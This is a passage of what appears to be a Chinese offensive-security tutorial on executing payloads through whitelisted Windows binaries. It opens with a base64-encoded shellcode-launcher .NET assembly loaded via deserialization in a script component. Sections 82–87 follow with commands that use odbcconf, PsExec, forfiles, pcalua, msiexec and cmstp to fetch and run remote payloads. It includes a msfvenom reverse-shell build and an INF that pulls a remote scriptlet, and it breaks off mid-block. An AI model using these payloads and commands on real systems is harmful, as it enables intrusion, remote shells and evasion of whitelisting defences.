class="line">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;+  </span><br><span class="line">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;+  </span><br><span class="line">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;+  </span><br><span class="line">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;+  </span><br><span class="line">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;+  </span><br><span class="line">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA&quot;+  </span><br><span class="line">&quot;AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA&quot;+  </span><br><span class="line">&quot;AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+  </span><br><span class="line">&quot;KAIAAAYAACoAAAAAAAAA&#x2F;OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH&#x2F;rDxhfAIsIMHPDQHH&quot;+  </span><br><span class="line">&quot;4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx&#x2F;6zBzw0BxzjgdfYDffg7fSR15FiL&quot;+  </span><br><span class="line">&quot;WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf&#x2F;gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej&#x2F;&quot;+  </span><br><span class="line">&quot;0LiQAQAAKcRUUGgpgGsA&#x2F;9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D&#x2F;1ZdqEFZXaJmldGH&#x2F;&quot;+  </span><br><span class="line">&quot;1YXAdAr&#x2F;Tgh17OhnAAAAagBqBFZXaALZyF&#x2F;&#x2F;1YP4AH42izZqQGgAEAAAVmoAaFikU+X&#x2F;1ZNTagBW&quot;+  </span><br><span class="line">&quot;U1doAtnIX&#x2F;&#x2F;Vg&#x2F;gAfShYaABAAABqAFBoCy8PMP&#x2F;VV2h1bk1h&#x2F;9VeXv8MJA+FcP&#x2F;&#x2F;&#x2F;+mb&#x2F;&#x2F;&#x2F;&#x2F;AcMp&quot;+  </span><br><span class="line">&quot;xnXBw7vwtaJWagBT&#x2F;9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKC  </span><br><span class="line">hYGjml+&quot;+&quot;AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo&quot;  </span><br><span class="line">&quot;BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z&quot;+  </span><br><span class="line">&quot;MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA&quot;+  </span><br><span class="line">&quot;ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA&quot;+  </span><br><span class="line">&quot;DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB&quot;+  </span><br><span class="line">&quot;AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC&quot;+</span><br><span class="line">&quot;hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA&quot;+  </span><br><span class="line">&quot;AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA&quot;+  </span><br><span class="line">&quot;aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA&quot;+  </span><br><span class="line">&quot;AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA&quot;+  </span><br><span class="line">&quot;BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu&quot;+  </span><br><span class="line">&quot;ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA&quot;+  </span><br><span class="line">&quot;UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB&#x2F;AAEAAAEJ&quot;+  </span><br><span class="line">&quot;AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA&quot;+  </span><br><span class="line">&quot;AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD&quot;+  </span><br><span class="line">&quot;b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA&quot;+  </span><br><span class="line">&quot;UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT&quot;+  </span><br><span class="line">&quot;aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs&quot;+  </span><br><span class="line">&quot;cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh&quot;+  </span><br><span class="line">&quot;dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp&quot;+  </span><br><span class="line">&quot;dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u&quot;+  </span><br><span class="line">&quot;AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0&quot;+  </span><br><span class="line">&quot;dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA&quot;+  </span><br><span class="line">&quot;Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB&quot;+  </span><br><span class="line">&quot;QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T&quot;+  </span><br><span class="line">&quot;dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs&quot;+  </span><br><span class="line">&quot;cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F&quot;+  </span><br><span class="line">&quot;eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A&quot;+  </span><br><span class="line">&quot;RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp&quot;+  </span><br><span class="line">&quot;ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ&quot;+  </span><br><span class="line">&quot;AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH&quot;+  </span><br><span class="line">&quot;AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy&quot;+  </span><br><span class="line">&quot;YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl&quot;+  </span><br><span class="line">&quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs&quot;+  </span><br><span class="line">&quot;dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy&quot;+  </span><br><span class="line">&quot;aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW&quot;+  </span><br><span class="line">&quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+  </span><br><span class="line">&quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA&quot;+  </span><br><span class="line">&quot;RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+  </span><br><span class="line">&quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+  </span><br><span class="line">&quot;AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp&quot;+  </span><br><span class="line">&quot;AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA&quot;+  </span><br><span class="line">&quot;bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu&quot;+  </span><br><span class="line">&quot;AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA&quot;+  </span><br><span class="line">&quot;NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB&quot;+  </span><br><span class="line">&quot;AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs&quot;+  </span><br><span class="line">&quot;ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line"> </span><br><span class="line">var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;  </span><br><span class="line"> </span><br><span class="line">try &#123;  </span><br><span class="line">setversion();  </span><br><span class="line">var stm &#x3D; base64ToStream(serialized_obj);  </span><br><span class="line">var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);  </span><br><span class="line">var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);  </span><br><span class="line">var d &#x3D; fmt.Deserialize_2(stm);  </span><br><span class="line">al.Add(undefined);  </span><br><span class="line">var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  </span><br><span class="line">&#125; catch (e) &#123;  </span><br><span class="line">debug(e.message);  </span><br><span class="line">&#125;  </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;&#x2F;component&gt;  </span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
<h2 id="82-基于白名单Odbcconf执行payload第十二季"><a href="#82-基于白名单Odbcconf执行payload第十二季" class="headerlink" title="82. 基于白名单Odbcconf执行payload第十二季"></a>82. 基于白名单Odbcconf执行payload第十二季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\odbcconf.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\odbcconf.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\odbcconf.exe</span><br><span class="line">C:\Windows\SysWOW64\odbcconf.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\odbcconf.exe &#x2F;a &#123;regsvr C:\Micropoor_Odbcconf.dll&#125;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk">https://drive.google.com/open?id=1j12W7VOhv_-NdnZpFhWLwdt8sQwxdAsk</a></p>
<h2 id="83-基于白名单PsExec执行payload第十三季"><a href="#83-基于白名单PsExec执行payload第十三季" class="headerlink" title="83. 基于白名单PsExec执行payload第十三季"></a>83. 基于白名单PsExec执行payload第十三季</h2><ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -d -s msiexec.exe &#x2F;q &#x2F;i &lt;http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev_x86_msi_53.txt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="84-基于白名单Forfiles执行payload第十四季"><a href="#84-基于白名单Forfiles执行payload第十四季" class="headerlink" title="84. 基于白名单Forfiles执行payload第十四季"></a>84. 基于白名单Forfiles执行payload第十四季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\forfiles.exe </span><br><span class="line">C:\WINDOWS\SysWOW64\forfiles.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\forfiles.exe </span><br><span class="line">C:\WINDOWS\SysWOW64\forfiles.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m cmd.exe &#x2F;c &quot;msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.4&#x2F;Micropoor_rev_x86_msi_53.txt&quot;</span><br></pre></td></tr></table></figure>
<h2 id="85-基于白名单Pcalua执行payload第十五季"><a href="#85-基于白名单Pcalua执行payload第十五季" class="headerlink" title="85. 基于白名单Pcalua执行payload第十五季"></a>85. 基于白名单Pcalua执行payload第十五季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\pcalua.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua -m -a \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure>
<h2 id="86-基于白名单Msiexec执行payload第八季补充"><a href="#86-基于白名单Msiexec执行payload第八季补充" class="headerlink" title="86. 基于白名单Msiexec执行payload第八季补充"></a>86. 基于白名单Msiexec执行payload第八季补充</h2><ul>
<li>基于白名单Msiexec.exe配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐ f dll &gt; Micropoor_rev_x64_53.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;y C:\Users\John\Desktop\Micropoor_rev_x64_dll.dll</span><br></pre></td></tr></table></figure>
<h2 id="87-基于白名单Cmstp-exe执行payload第十六季"><a href="#87-基于白名单Cmstp-exe执行payload第十六季" class="headerlink" title="87. 基于白名单Cmstp.exe执行payload第十六季"></a>87. 基于白名单Cmstp.exe执行payload第十六季</h2><ul>
<li>Windows 2003 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe </span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe </span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;ni &#x2F;s C:\Users\John\Desktop\rev.inf</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_rev_cmstp_inf</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$ 4</span><br><span class="line"> </span><br><span class="line">AdvancedINF&#x3D;5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;192.168.1.4&#x2F;cmstp_rev_53_x64.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Micropoor&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Micropoor&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>cmstp_rev_53_x64.sct</strong> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 